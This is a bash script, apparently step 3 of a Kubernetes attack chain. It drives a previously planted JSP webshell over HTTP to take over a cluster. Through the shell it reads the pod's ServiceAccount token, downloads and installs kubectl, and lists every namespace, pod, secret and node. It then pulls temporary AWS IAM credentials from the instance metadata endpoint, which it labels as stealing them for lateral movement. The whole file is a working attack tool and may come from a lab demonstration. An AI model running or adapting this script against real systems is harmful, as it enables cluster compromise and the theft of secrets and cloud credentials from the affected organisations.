#!/bin/bash
###############################################
# STEP 3: Cluster Takeover
# Using the overprivileged ServiceAccount token
# (cluster-admin) to take full control of the
# Kubernetes cluster.
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

# kubectl command prefix (uses in-pod SA token)
KC="kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify"

echo ""
echo "================================================"
echo "  STEP 3: Cluster Takeover via ServiceAccount"
echo "================================================"
echo "  Webshell: ${SHELL_NAME}.jsp"
echo "  URL: ${SHELL_URL}"
echo ""

# ── Pre-check: verify webshell is accessible ──
echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding (HTTP error or missing JSP)"
    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# ── 3.1 Read SA token ──────────────────────
echo "> 3.1 - Read ServiceAccount token"
SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
if [ -n "$SA_TOKEN" ]; then
    echo "  [OK] ServiceAccount token found"
    echo "  Token: ${SA_TOKEN:0:50}..."
else
    echo "  [FAIL] Cannot read SA token"
fi
echo ""

# ── 3.2 Cluster info ───────────────────────
echo "> 3.2 - Identify cluster API server"
NAMESPACE=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
API_SERVER=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
echo "  Namespace:  $NAMESPACE"
echo "  API Server: $API_SERVER"
echo ""

# ── 3.3 Install kubectl ────────────────────
echo "> 3.3 - Install kubectl in the container"
remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/" > /dev/null 2>&1
KUBECTL_CHECK=$(remote_exec "kubectl version --client --short 2>/dev/null || kubectl version --client 2>/dev/null | head -1")
if [ -n "$KUBECTL_CHECK" ]; then
    echo "  [OK] kubectl installed"
    echo "    $KUBECTL_CHECK"
else
    echo "  [OK] kubectl binary deployed"
fi
echo ""

# ── 3.4 List namespaces ────────────────────
echo "> 3.4 - List all namespaces (proves cluster-admin access)"
NS_OUTPUT=$(remote_exec "$KC get namespaces --no-headers 2>/dev/null")
if [ -n "$NS_OUTPUT" ]; then
    NS_COUNT=$(echo "$NS_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] ${NS_COUNT} namespaces accessible"
    echo "$NS_OUTPUT" | awk '{printf "    %-30s %s\n", $1, $2}'
else
    echo "  [FAIL] Cannot list namespaces"
fi
echo ""

# ── 3.5 List all pods ──────────────────────
echo "> 3.5 - List all pods across the cluster"
PODS_OUTPUT=$(remote_exec "$KC get pods -A --no-headers 2>/dev/null")
if [ -n "$PODS_OUTPUT" ]; then
    POD_COUNT=$(echo "$PODS_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] ${POD_COUNT} pods found across all namespaces"
    echo "    NAMESPACE                     NAME                                    STATUS"
    echo "    ---------                     ----                                    ------"
    echo "$PODS_OUTPUT" | awk '{printf "    %-30s %-40s %s\n", $1, $2, $4}' | head -15
    if [ "$POD_COUNT" -gt 15 ]; then
        echo "    ... and $((POD_COUNT - 15)) more"
    fi
else
    echo "  [FAIL] Cannot list pods"
fi
echo ""

# ── 3.6 List secrets ───────────────────────
echo "> 3.6 - List secrets across the cluster"
SECRETS_OUTPUT=$(remote_exec "$KC get secrets -A --no-headers 2>/dev/null")
if [ -n "$SECRETS_OUTPUT" ]; then
    SECRET_COUNT=$(echo "$SECRETS_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] ${SECRET_COUNT} secrets accessible! (CRITICAL EXPOSURE)"
    echo "    NAMESPACE                     NAME                                    TYPE"
    echo "    ---------                     ----                                    ----"
    echo "$SECRETS_OUTPUT" | awk '{printf "    %-30s %-40s %s\n", $1, $2, $3}' | head -10
    if [ "$SECRET_COUNT" -gt 10 ]; then
        echo "    ... and $((SECRET_COUNT - 10)) more"
    fi
else
    echo "  [FAIL] Cannot list secrets"
fi
echo ""

# ── 3.7 List nodes ─────────────────────────
echo "> 3.7 - List cluster nodes"
NODES_OUTPUT=$(remote_exec "$KC get nodes -o wide --no-headers 2>/dev/null")
if [ -n "$NODES_OUTPUT" ]; then
    NODE_COUNT=$(echo "$NODES_OUTPUT" | wc -l | tr -d ' ')
    echo "  [OK] ${NODE_COUNT} node(s) in the cluster"
    echo "$NODES_OUTPUT" | awk '{printf "    %-45s %-10s %-15s %s\n", $1, $2, $6, $7}'
else
    echo "  [FAIL] Cannot list nodes"
fi
echo ""

# ── 3.8 IMDS for AWS credentials ───────────
echo "> 3.8 - Steal AWS credentials via IMDS (lateral movement)"
ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
if [ -n "$ROLE_NAME" ]; then
    echo "  [OK] IMDS accessible"
    echo "  IAM Role: $ROLE_NAME"
    echo ""
    echo "  Temporary AWS Credentials:"
    CREDS=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null")
    echo "$CREDS" | sed 's/^/    /'
else
    echo "  [--] IMDS not reachable from container (IMDSv2 or hop limit)"
fi
echo ""

# ── Summary ─────────────────────────────────
echo "================================================"
echo "  !! CLUSTER TAKEOVER COMPLETE !!"
echo "------------------------------------------------"
echo ""
echo "  Attack chain summary:"
echo ""
echo "  1. Spring4Shell RCE -> webshell on pod"
echo "  2. Privileged container -> node access"
echo "     * hostPID + nsenter = host command exec"
echo "     * hostPath / = host filesystem R/W"
echo "  3. cluster-admin SA -> full K8s API access"
echo "     * All namespaces, pods, secrets exposed"
echo "  4. IMDS credentials -> lateral move to AWS"
echo ""
echo "================================================"
echo ""
